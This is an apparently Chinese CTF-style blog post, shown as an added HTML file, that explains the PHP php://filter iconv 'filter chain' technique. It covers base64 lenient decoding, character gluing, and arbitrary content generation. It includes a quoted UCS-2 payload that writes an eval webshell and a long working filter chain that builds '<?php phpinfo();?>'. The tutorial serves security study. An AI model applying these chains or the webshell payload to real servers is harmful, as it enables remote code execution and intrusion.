@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>FilterChain攻击解析及利用 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="FilterChain攻击解析及利用 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-02T09:39:56.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>2,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">FilterChain攻击解析及利用</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="BASE64解码和编码原理浅析"><a href="#BASE64解码和编码原理浅析" class="headerlink" title="BASE64解码和编码原理浅析"></a>BASE64解码和编码原理浅析</h1><h2 id="Encoding"><a href="#Encoding" class="headerlink" title="Encoding"></a>Encoding</h2><p>Base64编码字符表如下，编码过后的字符只能在下面范围内选（还有等号”&#x3D;”)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674910922105-e818dd3c-cbb0-4757-9851-4a2ae829b2bf.png#averageHue=%23fdfcfc&clientId=u816014a6-e4da-4&from=paste&id=ue51e7e50&name=image.png&originHeight=528&originWidth=746&originalType=url&ratio=1&rotation=0&showTitle=false&size=55212&status=done&style=none&taskId=ue2c99ab5-dc62-4c44-acea-0a91852b35d&title=" alt="image.png"><br>Base64编码是从<code>3-&gt;4</code>的编码，也就是从三个字节变成四个字节的过程，假如编码字符总数不是3或者不是3的倍数，<strong>空缺部分会用”&#x3D;”补齐</strong>，例如：<br><code>Boo-&gt;Qm9v</code>、<code>Boog-&gt;Qm9vZw==</code><br>这两个例子符合我们所说的规则，第一个由3变成4，第二个是4（不是3的倍数）因此最后字符数字为8，有2个等号进行补齐了，很简单的原理</p>
+<h2 id="Decoding"><a href="#Decoding" class="headerlink" title="Decoding"></a>Decoding</h2><p>解码也就是编码的你过程，理所当然就是<code>4-&gt;3</code>的过程，这一点也不需要演示了，很基础的知识<br>而且当我们把补齐的等号去除后，依然可以成功解码，比如<code>Qm9vZw-&gt;Boog</code><br>上面我们提到了有效字符，假如需要解码的字符串中包含<strong>无效字符</strong>，那么就会忽略掉那些字符，只对有效字符进行解码，这是base64的一个特性，这里叫他<strong>宽松性</strong>。也就是说<code>Qm&lt;?9v(Z$w-&gt;Boo</code><br>无效字符不会进行解码，在之前讲的<strong>file_put_contents与死亡代码</strong>中我们就用到了这一特性</p>
+<h1 id="Filterchain构造（原理阐述）"><a href="#Filterchain构造（原理阐述）" class="headerlink" title="Filterchain构造（原理阐述）"></a>Filterchain构造（原理阐述）</h1><h2 id="回顾死亡代码"><a href="#回顾死亡代码" class="headerlink" title="回顾死亡代码"></a>回顾死亡代码</h2><p><a target="_blank" rel="noopener" href="https://www.yuque.com/boogipop/iwyn7t/pp7dyy?view=doc_embed">file_put_contents与死亡代码</a><br>在这里回顾一下之前的死亡代码和file_put_contents的利用中，有一条bypass分支，就是利用&#96;&#96;<br>其中有一条payload是利用iconv去反转字符进行bypass</p>
+<blockquote>
+<p>payload：<code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=s1mple.php;</code>其实也是变向的转换回来，从而利用那一次转换对死亡代码进行扰乱；载荷效果如下：<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662422357685-de42826b-d3fe-4cf3-92ef-c8335bcf1d6b.png#averageHue=%23090705&clientId=ud9101c01-db66-4&from=paste&height=96&id=udce339e5&name=image.png&originHeight=120&originWidth=1505&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16136&status=done&style=none&taskId=u8f2cc0c3-a613-4030-8d03-8675d18abfa&title=&width=1204" alt="image.png"></p>
+</blockquote>
+<p>而今天我们要说的filterChain也和iconv中的编码有关。<code>iconv -l</code>可以查看本地的iconv编码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674912322632-e8e15422-8cf9-437d-9fd0-a5792d8cb81f.png#averageHue=%232c2e35&clientId=uac0030b1-0a92-4&from=paste&height=325&id=uade6bcdb&name=image.png&originHeight=406&originWidth=655&originalType=binary&ratio=1&rotation=0&showTitle=false&size=249740&status=done&style=none&taskId=uceefadd7-d8bb-42d4-91f2-4e049777ebd&title=&width=524" alt="image.png"></p>
+<h2 id="特性一（双重去杂）"><a href="#特性一（双重去杂）" class="headerlink" title="特性一（双重去杂）"></a>特性一（双重去杂）</h2><p>接下来我们来写一个Demo，看看会输出什么：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content1</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/convert.iconv.UTF8.CSISO2022KR/resource=data://,bbb&#x27;</span>);</span><br><span class="line"><span class="variable">$content2</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode/resource=data://,bbb&#x27;</span>);</span><br><span class="line"><span class="variable">$content3</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,bbb&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$content1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;==========================================&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content2</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$content2</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;==========================================&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content3</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$content3</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674914475933-5c5dec31-7c34-4ce8-853e-4484b0ad96cb.png#averageHue=%232b2f39&clientId=uac0030b1-0a92-4&from=paste&height=182&id=uf4d175b7&name=image.png&originHeight=228&originWidth=1005&originalType=binary&ratio=1&rotation=0&showTitle=false&size=157165&status=done&style=none&taskId=u5c9c822c-090a-477f-b126-9ee1a6dc844&title=&width=804" alt="image.png"><br>经过从<code>UTF-8-&gt;CSISO2022KR</code>后,bbb变成了七个字节，为什么只显示3个bbb是因为其余的是不可见字符，我们可以将十六进制去转换一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674914566281-345f291d-07b9-422c-a500-844e8ac5547e.png#averageHue=%23fdfdfd&clientId=uac0030b1-0a92-4&from=paste&height=118&id=u92c3a443&name=image.png&originHeight=148&originWidth=1247&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13183&status=done&style=none&taskId=u978eb75f-6eaf-48dc-a395-178eb63039a&title=&width=997.6" alt="image.png"><br>在这里就要介绍filter第一个特性了，也就是强制显示（这一点是根据Decoding阶段忽略无效字符得出的)</p>
+<p>根据上述Decoding阶段filter不解析无效字符，拿上述输出结果中的第二条数据来看，我们已经看到了第一条输出结果中16进制是什么字符串，也就是说有效字符只有<code>Cbbb</code>，我们对其进行base64的decoding，符合<code>4-&gt;3</code>因此解码出的虽然是乱码，但是只有3个字符，因此是符合我们的规则的，这一点我叫其<strong>双重去杂</strong></p>
+<h2 id="特性二（粘合性）"><a href="#特性二（粘合性）" class="headerlink" title="特性二（粘合性）"></a>特性二（粘合性）</h2><p>先看下列的例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content1</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4/resource=data://,bbb&quot;</span>);</span><br><span class="line"><span class="variable">$content2</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,bbb&#x27;</span>);</span><br><span class="line"><span class="variable">$content3</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode/resource=data://,bbb&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$content1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;==========================================&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content2</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$content2</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;==========================================&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content3</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$content3</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>上述代码的输出结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674915242967-e6558b50-0b52-47e0-91b8-3d3664e203b3.png#averageHue=%2320222a&clientId=uac0030b1-0a92-4&from=paste&height=192&id=u43e66e8f&name=image.png&originHeight=240&originWidth=717&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69899&status=done&style=none&taskId=ued945119-1b10-4dbe-a62e-93dd1dc4efb&title=&width=573.6" alt="image.png"><br>发现了什么规律没有？第一条输出结果是一个新的构造，构造出了字符<code>&quot;1&quot;</code>，和异或有点像，然后第二条输出结果就是特性一中的那一条。第三条输出结果是在第二条结果的过滤器基础上加上了第一条的过滤器，得出的结果就是构造出的<code>&quot;1&quot;</code>在第一位，然后其他的往后推移了一位，这样就把构造出的<code>1</code>和<code>C</code>连接在了一起，大胆设想一下，我们只要能构造26个字母以及所有数字，是不是理论就可以通过这个filterchain获取任意的语句了？<br>这个特性我叫它<strong>粘合性</strong>，因为构造出的字符可以拼贴在一起</p>
+<h2 id="任意字符构造"><a href="#任意字符构造" class="headerlink" title="任意字符构造"></a>任意字符构造</h2><p>这里我放上3个大佬写的FUZZ及Generate的脚本，推荐把源码看一看，理一理思路：<br><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a><br>我选择了探姬师傅的改良版，我们可以看一下res文件夹下的fuzz结果：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674915791470-79b8e163-14c2-41db-8ef1-6b722530889c.png#averageHue=%23f4f4f3&clientId=u3b02fee0-ef82-4&from=paste&height=550&id=ua1bd1b7f&name=image.png&originHeight=687&originWidth=1325&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73266&status=done&style=none&taskId=u2ce8cc1f-02bb-4154-bbe4-f7355fd26c9&title=&width=1060" alt="image.png"><br>对应的都是生成的字母，根据探姬师傅的优化版还有一个py字典：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674915932642-2b553b6d-8e1f-4614-9cfb-097f0b9ec5f3.png#averageHue=%232c2c2b&clientId=u3b02fee0-ef82-4&from=paste&height=823&id=ud58fb497&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=275991&status=done&style=none&taskId=u8af3379f-4967-4cb1-aed0-5e714446cf5&title=&width=1536" alt="image.png"><br>这个Fuzz字典的原理是利用<code>iconv -l</code>查看本地编码集，然后放入iconv_list数组中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674916034713-2a761cfc-fd70-447d-a231-6e69422f2c8d.png#averageHue=%23313c45&clientId=u3b02fee0-ef82-4&from=paste&height=494&id=u3fb058c2&name=image.png&originHeight=617&originWidth=1654&originalType=binary&ratio=1&rotation=0&showTitle=false&size=284540&status=done&style=none&taskId=ufc09bb54-dc69-434c-b3b6-3c5486c86d3&title=&width=1323.2" alt="image.png"><br>最后在Fuzzer.php进行rand打乱组合：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674916059245-be498d7c-58e8-4f46-a67a-a24fc1a5c8da.png#averageHue=%23313a43&clientId=u3b02fee0-ef82-4&from=paste&height=517&id=ub0f2582b&name=image.png&originHeight=646&originWidth=1536&originalType=binary&ratio=1&rotation=0&showTitle=false&size=124505&status=done&style=none&taskId=u16ddd9f1-970e-41af-8661-20ec43e35a1&title=&width=1228.8" alt="image.png"><br>我们根据Dictionary.py中的字典，我们手动测试一下到底是怎么回事，比如我们要构造<code>&lt;?php phpinfo();?&gt;</code>首先我们需要得到它的base64字符串<code>PD9waHAgcGhwaW5mbygpOz8+</code>，然后把这个字符串逆序<code>+8zOpgybm5WawhGcgAHaw9DP</code>（因为新嵌套的过滤器所生成的字符是拼接在最前面，因此需要逆序），我们利用工具可以得出结果：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674916391564-3c7fcb54-4f77-4fe5-81f8-3b20c01f1e6d.png#averageHue=%232e2e2d&clientId=u3b02fee0-ef82-4&from=paste&height=87&id=uee666500&name=image.png&originHeight=109&originWidth=542&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11391&status=done&style=none&taskId=ucd46e3c3-e01b-4b27-81fb-8dca4927027&title=&width=433.6" alt="image.png"><br>（指定你读取的文件和需要的字符串）<br>我们本地新建一个flag文件内容是<code>test_flagaaaaaaaaaaaaaaa</code>(<strong>加3的倍数的a，为了保证encoding的时候不出问题，并且保证test_flag不被新添的字符覆盖</strong>），然后用脚本跑出结果：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674916586076-f2378b76-a6f8-4cf6-9986-50a8931855aa.png#averageHue=%23464a52&clientId=u3b02fee0-ef82-4&from=paste&height=426&id=u6e4e9ad1&name=image.png&originHeight=532&originWidth=1477&originalType=binary&ratio=1&rotation=0&showTitle=false&size=92230&status=done&style=none&taskId=ubd38a4cd-ff9b-4c50-a31b-b69a042b3bd&title=&width=1181.6" alt="image.png"><br>最后我们进行一个测试：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=flag&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag&quot;</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输出结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674917304232-b7382218-f94d-4aa6-a673-ed181bd92f03.png#averageHue=%2325272e&clientId=u3b02fee0-ef82-4&from=paste&height=52&id=u241620f6&name=image.png&originHeight=65&originWidth=607&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18809&status=done&style=none&taskId=ucfaab3b9-c4d2-411c-8aa2-b09d77b0c6f&title=&width=485.6" alt="image.png"><br>可以发现由于双重性的存在，不可见字符被抹去了，最后变成了目标内容</p>
